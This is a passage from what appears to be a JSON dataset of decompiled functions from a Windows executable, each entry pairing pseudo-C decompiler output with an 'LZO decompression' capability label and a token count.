0xc), &var_27h + 3);\n        if (cVar1 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0048b880(&var_20h);\n    cVar1 = fcn.004502d0(&arg_10h);\n    if (cVar1 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_27h + 2);\n    fcn.0048b630(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1216
    },
    "0047efc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x0047f087\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0047f68b)\n// WARNING: Removing unreachable block (ram,0x0047f117)\n// WARNING: Removing unreachable block (ram,0x0047f11f)\n// WARNING: Removing unreachable block (ram,0x0047f136)\n// WARNING: Removing unreachable block (ram,0x0047f0f0)\n// WARNING: Removing unreachable block (ram,0x0047f141)\n// WARNING: Removing unreachable block (ram,0x0047f0f6)\n// WARNING: Removing unreachable block (ram,0x0047f0d3)\n// WARNING: Removing unreachable block (ram,0x0047f0dd)\n// WARNING: Removing unreachable block (ram,0x0047f4ea)\n// WARNING: Removing unreachable block (ram,0x0047f550)\n// WARNING: Removing unreachable block (ram,0x0047f0e3)\n// WARNING: Removing unreachable block (ram,0x0047f100)\n// WARNING: Removing unreachable block (ram,0x0047f650)\n// WARNING: Removing unreachable block (ram,0x0047f659)\n// WARNING: Removing unreachable block (ram,0x0047f83c)\n// WARNING: Removing unreachable block (ram,0x0047f850)\n// WARNING: Removing unreachable block (ram,0x0047f720)\n// WARNING: Removing unreachable block (ram,0x0047f4ed)\n// WARNING: Removing unreachable block (ram,0x0047f72f)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0047efc0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_36h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_18h + 0x6c;\n    fcn.004c0160(iVar2);\n    iVar2 = fcn.0044dcf0(iVar2);\n    *NULL = fcn.0048b140(0, 0, &var_1ch);\n    if (*(iVar2 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    var_20h = fcn.0048b140(0, 0, &var_27h + 1);\n    fcn.0048c930(0x20);\n    var_3ch = 1;\n    var_1ch = *(iVar2 + 0x34);\n    puVar3 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0047f0ac. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x5244d0\n            uVar5 = (**(*puVar3 * 4 + 0x5244d0))();\n            return uVar5;\n        }\n        if (3 < var_3ch) break;\n        puVar3 = &var_1ch + var_3ch;\n        var_1ch._0_1_ = *puVar3;\n        var_3ch = var_3ch + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (iVar4 = fcn.0044bf30(0x30, 0),  iVar4 != 0)) {\n        if (iVar4 == -1) {\n            iVar4 = *(var_20h + -0xc) + -1;\n        }\n        fcn.0048b9a0(0, iVar4);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0048cc10(0);\n        cVar1 = fcn.004bdf60(*(iVar2 + 8), *(iVar2 + 0xc), &var_27h + 3);\n        if (cVar1 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0048b880(&var_20h);\n    cVar1 = fcn.004502d0(&arg_10h);\n    if (cVar1 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_27h + 2);\n    fcn.0048b630(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1216
    },
    "0047f910": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0047f910(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            int32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    piVar3 = fcn.004c0160(arg_1ch + 0x6c);\n    *NULL = fcn.0048b140(0, 0, &var_1dh);\n    if (arg_18h == '\\0') {\n        uVar5 = fcn.0047e690(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    else {\n        uVar5 = fcn.0047efc0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    iVar1 = *(stack0xffffffe0 + -0xc);\n    if (iVar1 != 0) {\n        fcn.0048c390(iVar1, 0);\n        iVar4 = *arg_24h;\n        if (-1 < *(iVar4 + -4)) {\n            fcn.0048b100();\n            iVar4 = *arg_24h;\n        }\n        iVar2 = stack0xffffffe0;\n        if (*(piVar3 + 7) != '\\x01') {\n            if (*(piVar3 + 7) == '\\0') {\n                fcn.004512b0();\n            }\n            if (*(*piVar3 + 0x1c) != 0x451530) {\n                (**(*piVar3 + 0x1c))(iVar2, iVar1 + iVar2, iVar4);\n                goto code_r0x0047fa04;\n            }\n        }\n        sub.msvcrt.dll_memcpy(iVar4, iVar2, iVar1);\n    }\ncode_r0x0047fa04:\n    if (*0x515a34 == 0) {\n        iVar1 = *(stack0xffffffe0 + -4);\n        *(stack0xffffffe0 + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = stack0xffffffe0 + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return uVar5;\n    }\n    fcn.0048b610(&var_1dh);\n    return uVar5;\n}\n",
        "token_count": 659
    },
    "0047fad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0047fad0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    if (arg_18h == '\\0') {\n        uVar3 = fcn.0047e690(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    else {\n        uVar3 = fcn.0047efc0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    var_1ch = fcn.004ae940();\n    fcn.004bd410(var_20h, arg_24h, arg_20h, &var_1ch);\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.0048b610(&var_1ch);\n    return uVar3;\n}\n",
        "token_count": 439
    },
    "0047fbf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x0047fccc\n// WARNING: Removing unreachable block (ram,0x004800b1)\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004802d5)\n// WARNING: Removing unreachable block (ram,0x0047fd61)\n// WARNING: Removing unreachable block (ram,0x0047fd77)\n// WARNING: Removing unreachable block (ram,0x0047fd30)\n// WARNING: Removing unreachable block (ram,0x0047fd82)\n// WARNING: Removing unreachable block (ram,0x0047fd36)\n// WARNING: Removing unreachable block (ram,0x004801c3)\n// WARNING: Removing unreachable block (ram,0x004804a9)\n// WARNING: Removing unreachable block (ram,0x0048051d)\n// WARNING: Removing unreachable block (ram,0x004804b3)\n// WARNING: Removing unreachable block (ram,0x004804bc)\n// WARNING: Removing unreachable block (ram,0x00480513)\n// WARNING: Removing unreachable block (ram,0x004804c3)\n// WARNING: Removing unreachable block (ram,0x00480370)\n// WARNING: Removing unreachable block (ram,0x00480382)\n// WARNING: Removing unreachable block (ram,0x0047fd0d)\n// WARNING: Removing unreachable block (ram,0x0047fd58)\n// WARNING: Removing unreachable block (ram,0x0048029a)\n// WARNING: Removing unreachable block (ram,0x004800b4)\n// WARNING: Removing unreachable block (ram,0x004802a3)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0047fbf0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ah;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_18h + 0x6c;\n    fcn.004c01c0(iVar3);\n    iVar3 = fcn.0044de00(iVar3);\n    *NULL = fcn.0048b140(0, 0, &var_1ch);\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    var_20h = fcn.0048b140(0, 0, &var_27h + 1);\n    fcn.0048c930(0x20);\n    var_40h = 1;\n    var_1ch = *(iVar3 + 0x38);\n    puVar4 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0047fce6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x5248c8\n            uVar6 = (**(*puVar4 * 4 + 0x5248c8))();\n            return uVar6;\n        }\n        if (3 < var_40h) break;\n        puVar4 = &var_1ch + var_40h;\n        var_1ch._0_1_ = *puVar4;\n        var_40h = var_40h + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (uVar5 = fcn.0044bf30(0x30, 0),  uVar5 != 0)) {\n        uVar1 = *(var_20h + -0xc);\n        if (uVar5 == 0xffffffff) {\n            uVar5 = uVar1 - 1;\n        }\n        if (uVar1 < uVar5) {\n            uVar5 = uVar1;\n        }\n        fcn.0048ca60(0, uVar5, 0);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0048cc10(0);\n        cVar2 = fcn.004bdf60(*(iVar3 + 8), *(iVar3 + 0xc), &var_27h + 3);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0048b880(&var_20h);\n    cVar2 = fcn.00450410(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_27h + 2);\n    fcn.0048b630(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1266
    },
    "00480570": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x0048064c\n// WARNING: Removing unreachable block (ram,0x00480a31)\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00480c55)\n// WARNING: Removing unreachable block (ram,0x004806e1)\n// WARNING: Removing unreachable block (ram,0x004806f7)\n// WARNING: Removing unreachable block (ram,0x004806b0)\n// WARNING: Removing unreachable block (ram,0x00480702)\n// WARNING: Removing unreachable block (ram,0x004806b6)\n// WARNING: Removing unreachable block (ram,0x00480b43)\n// WARNING: Removing unreachable block (ram,0x00480e29)\n// WARNING: Removing unreachable block (ram,0x00480e9d)\n// WARNING: Removing unreachable block (ram,0x00480e33)\n// WARNING: Removing unreachable block (ram,0x00480e3c)\n// WARNING: Removing unreachable block (ram,0x00480e93)\n// WARNING: Removing unreachable block (ram,0x00480e43)\n// WARNING: Removing unreachable block (ram,0x00480cf0)\n// WARNING: Removing unreachable block (ram,0x00480d02)\n// WARNING: Removing unreachable block (ram,0x0048068d)\n// WARNING: Removing unreachable block (ram,0x004806d8)\n// WARNING: Removing unreachable block (ram,0x00480c1a)\n// WARNING: Removing unreachable block (ram,0x00480a34)\n// WARNING: Removing unreachable block (ram,0x00480c23)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.00480570(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ah;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_18h + 0x6c;\n    fcn.004c01c0(iVar3);\n    iVar3 = fcn.0044df10(iVar3);\n    *NULL = fcn.0048b140(0, 0, &var_1ch);\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    var_20h = fcn.0048b140(0, 0, &var_27h + 1);\n    fcn.0048c930(0x20);\n    var_40h = 1;\n    var_1ch = *(iVar3 + 0x38);\n    puVar4 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x00480666. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x5248b4\n            uVar6 = (**(*puVar4 * 4 + 0x5248b4))();\n            return uVar6;\n        }\n        if (3 < var_40h) break;\n        puVar4 = &var_1ch + var_40h;\n        var_1ch._0_1_ = *puVar4;\n        var_40h = var_40h + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (uVar5 = fcn.0044bf30(0x30, 0),  uVar5 != 0)) {\n        uVar1 = *(var_20h + -0xc);\n        if (uVar5 == 0xffffffff) {\n            uVar5 = uVar1 - 1;\n        }\n        if (uVar1 < uVar5) {\n            uVar5 = uVar1;\n        }\n        fcn.0048ca60(0, uVar5, 0);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0048cc10(0);\n        cVar2 = fcn.004bdf60(*(iVar3 + 8), *(iVar3 + 0xc), &var_27h + 3);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0048b880(&var_20h);\n    cVar2 = fcn.00450410(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_27h + 2);\n    fcn.0048b630(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1268
    },
    "00480f10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.00480f10(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            int32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    piVar2 = fcn.004c01c0(arg_1ch + 0x6c);\n    *NULL = fcn.0048b140(0, 0, &var_1dh);\n    if (arg_18h == '\\0') {\n        uVar5 = fcn.0047fbf0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    else {\n        uVar5 = fcn.00480570(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    iVar1 = *(stack0xffffffe0 + -0xc);\n    uVar4 = arg_ch & 0xffff0000 | uVar5 >> 0x20 & 0xffff;\n    if (iVar1 != 0) {\n        fcn.00484580(iVar1, 0);\n        iVar3 = *arg_24h;\n        if (-1 < *(iVar3 + -4)) {\n            fcn.004831f0();\n            iVar3 = *arg_24h;\n        }\n        (**(*piVar2 + 0x2c))(stack0xffffffe0, iVar1 + stack0xffffffe0, iVar3);\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(stack0xffffffe0 + -4);\n        *(stack0xffffffe0 + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = stack0xffffffe0 + -4;\n        iVar1 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (0 < iVar1) {\n        return uVar5 & 0xffffffff | uVar4 << 0x20;\n    }\n    fcn.0048b610(&var_1dh);\n    return uVar5 & 0xffffffff | uVar4 << 0x20;\n}\n",
        "token_count": 630
    },
    "00481090": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.00481090(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    if (arg_18h == '\\0') {\n        uVar4 = fcn.0047fbf0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    else {\n        uVar4 = fcn.00480570(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    uVar3 = arg_ch & 0xffff0000 | uVar4 >> 0x20 & 0xffff;\n    var_1ch = fcn.004ae940();\n    fcn.004bd410(var_20h, arg_24h, arg_20h, &var_1ch);\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar4 & 0xffffffff | uVar3 << 0x20;\n    }\n    fcn.0048b610(&var_1ch);\n    return uVar4 & 0xffffffff | uVar3 << 0x20;\n}\n",
        "token_count": 518
    },
    "00481270": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00481270(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint *puVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    unkbyte10 in_stack_00000018;\n    uint uStack116;\n    uint *puStack112;\n    uint32_t auStack108 [4];\n    unkbyte10 aStack92 [2];\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uchar var_21h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    var_3ch = arg_10h;\n    var_40h = arg_18h;\n    auStack108[0] = arg_14h + 0x6c;\n    puStack112 = 0x481299;\n    fcn.004aebe0();\n    puStack112 = &fcn.00481270::var_20h;\n    uStack116 = 0x4812a7;\n    var_30h = fcn.004c0160();\n    uStack116 = 0x4812b4;\n    iVar3 = fcn.00437ed0();\n    iVar3 = -iVar3;\n    piVar7 = &stack0xffffff90 + iVar3;\n    uVar6 = &fcn.00481270::var_40h + iVar3 + 3 & 0xfffffff0;\n    var_34h = uVar6;\n    *(&stack0xffffff8c + iVar3) = 0x4812c5;\n    var_1ch = fcn.004ae940();\n    *(&stack0xffffffa0 + iVar3) = 0;\n    *(&stack0xffffff9c + iVar3) = 0x5243cc;\n    *(&stack0xffffff98 + iVar3) = 0x40;\n    *(&stack0xffffffa4 + iVar3) = in_stack_00000018;\n    *(&stack0xffffff94 + iVar3) = uVar6;\n    *(&stack0xffffff90 + iVar3) = &fcn.00481270::var_1ch;\n    *(&stack0xffffff8c + iVar3) = 0x4812f6;\n    iVar4 = fcn.004bd670();\n    if (0x3f < iVar4) {\n        *(&stack0xffffff8c + iVar3) = 0x48130e;\n        iVar5 = fcn.00437ed0();\n        iVar5 = -iVar5;\n        piVar7 = &stack0xffffff90 + iVar5 + iVar3;\n        uVar6 = &fcn.00481270::var_40h + iVar5 + iVar3 + 3 & 0xfffffff0;\n        var_34h = uVar6;\n        *(&stack0xffffff8c + iVar5 + iVar3) = 0x48131f;\n        var_1ch = fcn.004ae940();\n        *(&stack0xffffffa0 + iVar5 + iVar3) = 0;\n        *(&stack0xffffff9c + iVar5 + iVar3) = 0x5243cc;\n        *(&stack0xffffff98 + iVar5 + iVar3) = iVar4 + 1;\n        *(&stack0xffffffa4 + iVar5 + iVar3) = in_stack_00000018;\n        *(&stack0xffffff94 + iVar5 + iVar3) = uVar6;\n        *(&stack0xffffff90 + iVar5 + iVar3) = &fcn.00481270::var_1ch;\n        *(&stack0xffffff8c + iVar5 + iVar3) = 0x481349;\n        iVar4 = fcn.004bd670();\n    }\n    piVar7[1] = 0;\n    piVar7[2] = &stack0xffffffdb;\n    *piVar7 = iVar4;\n    piVar7[-1] = 0x481364;\n    fcn.0048cf60();\n    piVar10 = piVar7 + -3;\n    if (-1 < *(var_1ch + -4)) {\n        piVar7[-4] = 0x481437;\n        fcn.0048b100();\n    }\n    iVar3 = var_1ch;\n    if (*(var_30h + 7) != '\\x01') {\n        if (*(var_30h + 7) == '\\0') {\n            piVar7[-4] = 0x481478;\n            fcn.004512b0();\n            pcVar2 = *(*var_30h + 0x1c);\n            uVar6 = var_34h;\n        }\n        else {\n            pcVar2 = *(*var_30h + 0x1c);\n            uVar6 = var_34h;\n        }\n        var_34h = uVar6;\n        if (pcVar2 != 0x451530) {\n            piVar7[-1] = iVar3;\n            piVar7[-3] = uVar6;\n            piVar7[-2] = iVar4 + uVar6;\n            piVar9 = piVar7 + -4;\n            piVar7[-4] = 0x4814a0;\n            (*pcVar2)();\n            piVar10 = piVar9 + -0xc;\n            goto code_r0x004813ae;\n        }\n    }\n    uVar6 = var_34h;\n    piVar7[-1] = iVar4;\n    piVar7[-3] = iVar3;\n    piVar7[-2] = uVar6;\n    piVar7[-4] = 0x4813ae;\n    sub.msvcrt.dll_memcpy();\ncode_r0x004813ae:\n    piVar10[4] = &fcn.00481270::var_1ch;\n    piVar10[3] = var_40h;\n    piVar10[1] = arg_ch;\n    piVar10[2] = arg_14h;\n    *piVar10 = arg_8h;\n    if (var_3ch == '\\0') {\n        piVar10[-1] = 0x481425;\n        _var_30h = fcn.004814e0(*piVar10, piVar10[1], piVar10[2], piVar10[3], piVar10[4]);\n    }\n    else {\n        piVar10[-1] = 0x4813dc;\n        _var_30h = fcn.00481b20(*piVar10, piVar10[1], piVar10[2], piVar10[3], piVar10[4]);\n    }\n    if (*0x515a34 == 0) {\n        iVar3 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    puVar8 = piVar10 + -5;\n    if (iVar3 < 1) {\n        var_30h = _var_30h;\n        piVar10[-5] = &stack0xffffffdb;\n        var_2ch = _var_30h >> 0x20;\n        piVar10[-6] = 0x481462;\n        fcn.0048b610();\n        puVar8 = piVar10 + -6;\n    }\n    var_30h = _var_30h;\n    var_2ch = _var_30h >> 0x20;\n    puVar8[-1] = 0x481407;\n    fcn.004aed00();\n    return _var_30h;\n}\n",
        "token_count": 1848
    },
    "004814e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.004814e0(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t *piVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint8_t *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    char *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint8_t var_35h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    \n    var_34h = arg_ch;\n    var_35h = arg_ch;\n    iVar4 = fcn.004c0160(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar14 = fcn.004c2c70(0x44);\n        *puVar14 = 0x52c654;\n        *(puVar14 + 4) = 0;\n        puVar14[1] = 0;\n        puVar14[2] = 0;\n        puVar14[3] = 0;\n        *(puVar14 + 0x12) = 0;\n        puVar14[5] = 0;\n        puVar14[6] = 0;\n        puVar14[7] = 0;\n        puVar14[8] = 0;\n        puVar14[9] = 0;\n        puVar14[10] = 0;\n        puVar14[0xb] = 0;\n        puVar14[0xc] = 0;\n        puVar14[0xd] = 0;\n        *(puVar14 + 0x43) = 0;\n        fcn.004a9a30(arg_10h + 0x6c);\n        fcn.004ad130(puVar14, iVar5);\n        iVar11 = *piVar7;\n    }\n    puVar13 = *arg_18h;\n    piVar7 = puVar13 + -0xc;\n    if (*puVar13 == *(iVar11 + 0x38)) {\n        var_1ch = *(iVar11 + 0x34);\n        if (*piVar7 == 0) goto code_r0x00481596;\n        var_50h = *(iVar11 + 0x24);\n        puVar13 = puVar13 + 1;\n        var_44h = *(iVar11 + 0x28);\n    }\n    else {\n        var_1ch = *(iVar11 + 0x30);\n        var_50h = *(iVar11 + 0x1c);\n        var_44h = *(iVar11 + 0x20);\n    }\n    puVar8 = puVar13 + *piVar7;\n    if ((puVar13 < puVar8) && (puVar6 = puVar13,  (*(*(iVar4 + 0x18) + *puVar13 * 2) & 8) != 0)) {\n        do {\n            puVar6 = puVar6 + 1;\n            if (puVar8 == puVar6) {\n                iVar4 = puVar8 - puVar13;\n                goto joined_r0x004815c6;\n            }\n        } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n        iVar4 = puVar6 - puVar13;\njoined_r0x004815c6:\n        if (iVar4 != 0) {\n            var_24h = fcn.0048b140(0, 0, &var_20h);\n            fcn.0048c930(iVar4 * 2);\n            iVar5 = *(iVar11 + 0x2c);\n            var_40h = iVar4 - iVar5;\n            if (0 < var_40h) {\n                if (iVar5 < 0) {\n                    var_40h = iVar4;\n                }\n                if (*(iVar11 + 0xc) == 0) {\n                    fcn.0048bda0(puVar13, var_40h);\n                    iVar5 = *(iVar11 + 0x2c);\n                }\n                else {\n                    fcn.0048b490(0, *(var_24h + -0xc), var_40h * 2, 0);\n                    uVar15 = *(iVar11 + 0xc);\n                    uVar2 = *(iVar11 + 8);\n                    cVar1 = *(iVar11 + 0x12);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0048b100();\n                    }\n                    iVar5 = fcn.004bd030(var_24h, cVar1, uVar2, uVar15, puVar13, puVar13 + var_40h);\n                    if (-1 < *(var_24h + -4)) {\n                        fcn.0048b100();\n                    }\n                    uVar9 = iVar5 - var_24h;\n                    uVar12 = *(var_24h + -0xc);\n                    if (uVar12 < uVar9) {\n                        uVar15 = 0x524358;\n                        piVar7 = fcn.004be900(0x52436c, 0x524358);\n                        fcn.0048b630(&var_25h, uVar15, uVar9, uVar12);\n                        fcn.0048b630(&var_25h);\n                        uVar15 = fcn.0043a8e0(piVar7);\n                        fcn.004c2e40(uVar15);\n                        (**(*piVar7 + 4))();\n                        do {\n                            uVar15 = fcn.004c32d0();\n                            fcn.004c2e40(uVar15);\n                        } while( true );\n 